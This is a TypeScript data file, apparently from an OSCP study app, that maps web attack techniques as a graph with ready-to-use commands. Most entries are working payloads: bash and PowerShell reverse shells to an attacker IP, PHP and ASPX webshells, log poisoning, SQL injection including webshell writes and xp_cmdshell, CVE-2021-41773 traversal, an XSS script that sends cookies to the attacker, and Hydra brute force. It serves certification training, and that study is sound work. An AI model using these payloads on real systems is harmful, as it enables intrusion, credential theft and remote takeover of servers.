import type { OscpContent } from '@/types/oscp'

/** Phase: web enumeration + web application attacks (dir/vhost, LFI, SQLi, upload, injection). */
const web: OscpContent = {
    nodes: [
        {
            id: 'web-dirbust',
            title: 'Content discovery (dir busting)',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Fingerprint the stack, then brute directories and files. Feed the right extensions for the tech (.php/.aspx/.jsp). Chase .bak/.zip/.old (source leaks), /admin, and login forms.',
            commands: [
                {
                    label: 'feroxbuster (recursive)',
                    code: 'feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html',
                },
                {
                    label: 'ffuf (files + extensions)',
                    code: 'ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -mc 200,301,302,403',
                },
                {
                    label: 'Fingerprint',
                    code: 'whatweb http://<target> && curl -sI http://<target>',
                },
            ],
            tags: ['gobuster', 'ffuf', 'feroxbuster', 'dirbust', 'whatweb'],
        },
        {
            id: 'vhost-fuzz',
            title: 'VHost / subdomain fuzzing',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Different content is often served per Host header. Fuzz it, add discovered vhosts to /etc/hosts, then re-run content discovery against each.',
            commands: [
                {
                    label: 'ffuf Host header (filter by size)',
                    code: 'ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline-size>',
                },
                {
                    label: 'gobuster vhost',
                    code: 'gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
                },
                {
                    label: 'Pin a vhost in /etc/hosts',
                    code: `echo '<target-ip>  <vhost>.<domain>' | sudo tee -a /etc/hosts
curl -sI http://<vhost>.<domain>`,
                },
            ],
            tags: ['vhost', 'subdomain', 'host-header', 'ffuf'],
        },
        {
            id: 'login-form-found',
            title: 'Login form / admin panel',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'Try default and guessable creds first, then a targeted brute of the POST form. Watch for SQLi auth bypass in the same field.',
            commands: [
                {
                    label: 'Default / guessable creds',
                    code: `curl -s -X POST http://<target>/login -d 'username=admin&password=admin'
# try admin:admin, admin:password, root:root, <app>:admin`,
                },
                {
                    label: 'Hydra the POST form',
                    code: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"',
                },
                {
                    label: 'SQLi auth bypass',
                    code: `username: admin' OR 1=1-- -
password: x`,
                },
            ],
            tags: ['login', 'admin', 'auth', 'panel'],
        },
        {
            id: 'lfi',
            title: 'Local File Inclusion / path traversal',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'A parameter includes a file path. Read /etc/passwd (user list), dump PHP source via php://filter (find creds/DB strings), or escalate to RCE via log poisoning or /proc/self/environ. For Apache 2.4.49, CVE-2021-41773 adds path traversal to RCE; on Flask, the Werkzeug debugger PIN is a straight shot at code execution.',
            commands: [
                {
                    label: 'Read + source dump',
                    code: `curl "http://<target>/?page=../../../../etc/passwd"
curl "http://<target>/?page=php://filter/convert.base64-encode/resource=config"`,
                },
                {
                    label: 'Log poisoning -> RCE',
                    code: `curl -A "<?php system(\\$_GET['c']); ?>" http://<target>/
curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                },
                {
                    label: 'Apache CVE-2021-41773 + WAF bypass',
                    code: `curl "http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl "http://<target>/cgi-bin/.%252e/.%252e/.%252e/etc/passwd"`,
                },
            ],
            tags: ['lfi', 'traversal', 'php-filter', 'log-poison', 'waf', 'cve-2021-41773'],
        },
        {
            id: 'sqli',
            title: 'SQL injection',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Confirm with ' and time-based payloads. Then: auth bypass, UNION dump (creds/hashes), file write to web root, or RCE (MSSQL xp_cmdshell / MySQL INTO OUTFILE). Manual first - sqlmap only when allowed.",
            commands: [
                {
                    label: 'Auth bypass',
                    code: "' OR 1=1-- -",
                },
                {
                    label: 'UNION dump',
                    code: `' ORDER BY 5-- -
' UNION SELECT 1,2,group_concat(user,':',password),4,5 FROM users-- -`,
                },
                {
                    label: 'Confirm + time-based',
                    code: `' OR SLEEP(5)-- -
' AND 1=1-- -    vs    ' AND 1=2-- -`,
                },
                {
                    label: 'sqlmap (when allowed)',
                    code: `sqlmap -u 'http://<target>/item.php?id=1' --batch --dbs
sqlmap -u 'http://<target>/item.php?id=1' -D <db> -T users --dump`,
                },
                {
                    label: 'MySQL INTO OUTFILE / MSSQL xp_cmdshell',
                    code: `' UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php'-- -
'; EXEC xp_cmdshell 'whoami';--`,
                },
            ],
            tags: ['sqli', 'union', 'sqlmap', 'auth-bypass', 'injection'],
        },
        {
            id: 'cmd-injection',
            title: 'OS command injection',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'User input reaches a shell. Chain a command and go straight to a reverse shell. If blind, confirm out-of-band (ping/DNS) then upgrade.',
            commands: [
                {
                    label: 'Separators + reverse shell',
                    code: '; id | ; bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"\n`id`  $(id)  %0a id',
                },
                {
                    label: 'Blind OOB confirm',
                    code: `; ping -c 3 <kali-ip>
; nslookup $(whoami).<kali-ip>
# listen: sudo tcpdump -i tun0 icmp`,
                },
                {
                    label: 'Windows reverse shell',
                    code: `& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<kali-ip>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"`,
                },
            ],
            tags: ['command-injection', 'rce', 'shell'],
        },
        {
            id: 'file-upload',
            title: 'File upload to webshell',
            type: 'technique',
            phase: 'web',
            os: 'agnostic',
            description:
                'Upload an executable script matching the server language. Bypass filters via double extension, MIME spoof, magic bytes, or .htaccess. .aspx blocked? try .ashx. Then browse to it to execute.',
            commands: [
                {
                    label: 'PHP webshell + trigger',
                    code: `echo '<?php system($_GET["c"]); ?>' > sh.php.jpg   # then fix ext / MIME
curl "http://<target>/uploads/sh.php?c=id"`,
                },
                {
                    label: 'Filter bypasses',
                    code: `# double ext / case / null / .htaccess
sh.php.jpg   sh.pHp   sh.php%00.jpg   sh.phar
# .htaccess to force PHP:
echo 'AddType application/x-httpd-php .jpg' > .htaccess`,
                },
                {
                    label: 'ASPX / ASHX shell',
                    code: `echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>' > sh.aspx
# if .aspx blocked, try .ashx / .asmx / .config`,
                },
            ],
            tags: ['upload', 'webshell', 'bypass', 'aspx', 'ashx'],
        },
        {
            id: 'ssrf',
            title: 'Server-Side Request Forgery',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'The server fetches a URL you control. Hit cloud metadata (169.254.169.254) for tokens, reach internal-only services, or use gopher:// to talk raw protocols (Redis/MySQL) for RCE.',
            commands: [
                {
                    label: 'Local + metadata',
                    code: `curl "http://<target>/?url=http://127.0.0.1:80"
curl "http://<target>/?url=http://169.254.169.254/latest/meta-data/"
curl "http://<target>/?url=file:///etc/passwd"`,
                },
                {
                    label: 'Internal port fuzz',
                    code: "ffuf -u 'http://<target>/?url=http://127.0.0.1:FUZZ' -w /usr/share/seclists/Fuzzing/PORT-Numbers.txt -fs <baseline-size>",
                },
                {
                    label: 'gopher -> Redis RCE',
                    code: `# URL-encode a Redis protocol payload, then:
curl "http://<target>/?url=gopher://127.0.0.1:6379/_<encoded>"`,
                },
            ],
            tags: ['ssrf', 'metadata', 'gopher', 'internal'],
        },
        {
            id: 'idor',
            title: 'IDOR / broken access control',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Change a numeric/predictable ID to reach another user's data. Combine with mass-assignment (add admin:true on register) or a password-reset flaw for account takeover.",
            commands: [
                {
                    label: 'Numeric ID walk',
                    code: `ffuf -u 'http://<target>/api/user?id=FUZZ' -w <(seq 1 200) -mc 200 -fs <baseline-size>
curl -b 'session=<cookie>' http://<target>/profile?id=1`,
                },
                {
                    label: 'Mass-assignment / hidden field',
                    code: `curl -X POST http://<target>/register -d 'user=me&pass=x&admin=true&role=admin'
# replay the request with an extra privileged key from the JS / API docs`,
                },
            ],
            tags: ['idor', 'access-control', 'mass-assignment'],
        },
        {
            id: 'xss',
            title: 'Cross-Site Scripting',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                "Rarely the direct win on OSCP, but stored XSS can steal an admin session cookie -> hijack -> upload a webshell. Can also coerce NetNTLMv2 by pointing a victim at a UNC path.",
            commands: [
                {
                    label: 'Cookie steal (stored)',
                    code: `<script>fetch('http://<kali-ip>/?c='+document.cookie)</script>
# listener: python3 -m http.server 80`,
                },
                {
                    label: 'UNC coerce via XSS',
                    code: `<img src="\\\\<kali-ip>\\share">
# catch NetNTLMv2 with responder -I tun0`,
                },
            ],
            tags: ['xss', 'cookie', 'session', 'stored'],
        },
        {
            id: 'git-exposure',
            title: 'Exposed .git repository',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'A reachable .git/ directory (or a .gitignore revealing hidden paths) leaks the full source history. Dump it and grep the history for hardcoded secrets, API keys, and the framework/version for a CVE.',
            commands: [
                {
                    label: 'Dump and mine the repo',
                    code: `git-dumper http://<target>/.git/ ./site-git
git -C ./site-git log -p | grep -iE 'password|secret|api|key|token'`,
                },
                {
                    label: 'Manual .git dump',
                    code: `curl -s http://<target>/.git/HEAD
curl -s http://<target>/.git/config
wget --mirror -I .git http://<target>/.git/`,
                },
                {
                    label: 'Recover a deleted secret',
                    code: `git -C ./site-git log --all --full-history -- '*.env' '*.php' '*.config'
git -C ./site-git show HEAD:config.php`,
                },
            ],
            tags: ['git', 'source', 'secrets', 'git-dumper'],
        },
        {
            id: 'webdav',
            title: 'WebDAV enabled',
            type: 'finding',
            phase: 'web',
            os: 'agnostic',
            description:
                'The server answers PUT/MOVE on a DAV-enabled directory. Upload a script (often .txt, then MOVE it to .php/.aspx) and browse to it for a webshell.',
            commands: [
                {
                    label: 'Discover + upload',
                    code: `davtest -url http://<target>/dav/
cadaver http://<target>/dav/   # put sh.txt, then: move sh.txt sh.php`,
                },
                {
                    label: 'PUT then MOVE',
                    code: `curl -T sh.txt http://<target>/dav/sh.txt
curl -X MOVE -H 'Destination: http://<target>/dav/sh.php' http://<target>/dav/sh.txt
curl 'http://<target>/dav/sh.php?c=id'`,
                },
            ],
            tags: ['webdav', 'davtest', 'cadaver', 'put'],
        },
        {
            id: 'werkzeug-debugger-pin',
            title: 'Werkzeug / Flask debugger PIN',
            type: 'technique',
            phase: 'web',
            os: 'linux',
            description:
                'A Flask app running with debug=True exposes the Werkzeug interactive console on error pages. Reconstruct the PIN from machine-id, MAC, and process paths, then run Python as the app user and drop a reverse shell.',
            commands: [
                {
                    label: 'PIN -> RCE',
                    code: `cat /proc/sys/kernel/random/boot_id
cat /proc/net/arp
# feed into a Werkzeug PIN generator, then in the console:
import os; os.system('bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"')`,
                },
                {
                    label: 'Trigger the console',
                    code: `curl -s http://<target>/console
# or force an exception, then open /console in the browser`,
                },
            ],
            tags: ['werkzeug', 'flask', 'debug', 'pin', 'rce'],
        },
        {
            id: 'php-disable-functions',
            title: 'PHP disable_functions bypass',
            type: 'technique',
            phase: 'web',
            os: 'linux',
            description:
                'The webshell runs but system()/exec() are in disable_functions. Bypass it by preloading a shared object that re-enables exec, then run a normal reverse shell.',
            commands: [
                {
                    label: 'php_ld_preloader.py',
                    code: `# on Kali (search "php_ld_preloader.py" on GitHub):
python3 php_ld_preloader.py -u http://<target>/sh.php -c 'id'
# then upgrade to a reverse shell:
python3 php_ld_preloader.py -u http://<target>/sh.php -c 'bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"'`,
                },
            ],
            tags: ['php', 'disable_functions', 'preload', 'ld_preload'],
        },
        {
            id: 'pswa',
            title: 'PowerShell Web Access',
            type: 'finding',
            phase: 'web',
            os: 'windows',
            description:
                'PowerShell Web Access exposes a browser-based PowerShell console at /launch (usually port 443). Log in with domain creds for an instant interactive shell - no listener needed.',
            commands: [
                {
                    label: 'Discover + use',
                    code: `gobuster dir -u https://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt   # look for /launch /pswa
# browse to https://<target>/launch and log in with domain creds
# the browser console runs PowerShell -> whoami, then run tools`,
                },
            ],
            tags: ['pswa', 'powershell-web-access', 'launch', '443'],
        },
    ],
    edges: [
        { from: 'web-dirbust', to: 'login-form-found', label: '/admin, login page' },
        { from: 'web-dirbust', to: 'lfi', label: 'page= / file= param' },
        { from: 'web-dirbust', to: 'sqli', label: 'id= / search param' },
        { from: 'web-dirbust', to: 'file-upload', label: 'upload feature' },
        { from: 'web-dirbust', to: 'public-exploit-search', label: 'CMS/version found' },
        { from: 'web-dirbust', to: 'vhost-fuzz', label: 'wildcard / default site' },
        { from: 'vhost-fuzz', to: 'web-dirbust', label: 'new vhost -> re-bust' },
        { from: 'login-form-found', to: 'hydra-brute', label: 'brute the POST form' },
        { from: 'login-form-found', to: 'sqli', label: "try ' OR 1=1" },
        { from: 'lfi', to: 'user-list', label: '/etc/passwd' },
        { from: 'lfi', to: 'creds-found', label: 'php filter source -> creds' },
        { from: 'lfi', to: 'foothold-linux', label: 'log poison -> RCE' },
        { from: 'sqli', to: 'creds-found', label: 'UNION dumps creds' },
        { from: 'sqli', to: 'hash-to-crack', label: 'UNION dumps hashes' },
        { from: 'sqli', to: 'webshell-upload', label: 'file write to web root' },
        { from: 'sqli', to: 'foothold-windows', label: 'xp_cmdshell (MSSQL)' },
        { from: 'cmd-injection', to: 'foothold-linux', label: 'reverse shell (Linux)' },
        { from: 'cmd-injection', to: 'foothold-windows', label: 'reverse shell (Windows)' },
        { from: 'file-upload', to: 'webshell-upload', label: 'shell uploaded' },
        { from: 'ssrf', to: 'creds-found', label: 'metadata tokens' },
        { from: 'idor', to: 'creds-found', label: "other user's secrets" },
        { from: 'xss', to: 'file-upload', label: 'admin cookie -> panel' },
        { from: 'xss', to: 'netntlm-captured', label: 'coerce UNC auth' },
        { from: 'web-dirbust', to: 'git-exposure', label: '.git / .gitignore leaked' },
        { from: 'git-exposure', to: 'creds-found', label: 'secrets in history' },
        { from: 'git-exposure', to: 'public-exploit-search', label: 'framework/version for a CVE' },
        { from: 'web-dirbust', to: 'webdav', label: 'DAV methods allowed' },
        { from: 'webdav', to: 'webshell-upload', label: 'PUT + MOVE webshell' },
        { from: 'lfi', to: 'werkzeug-debugger-pin', label: 'Flask debug console exposed' },
        { from: 'werkzeug-debugger-pin', to: 'foothold-linux', label: 'PIN console -> RCE' },
        { from: 'webshell-upload', to: 'php-disable-functions', label: 'system() blocked by disable_functions' },
        { from: 'php-disable-functions', to: 'foothold-linux', label: 'preload .so -> shell' },
        { from: 'web-dirbust', to: 'pswa', label: '/launch (PowerShell Web Access)' },
        { from: 'pswa', to: 'foothold-windows', label: 'login with domain creds' },

        { from: 'login-form-found', to: 'creds-found', label: 'default/weak creds work' },
    ],
}

export default web
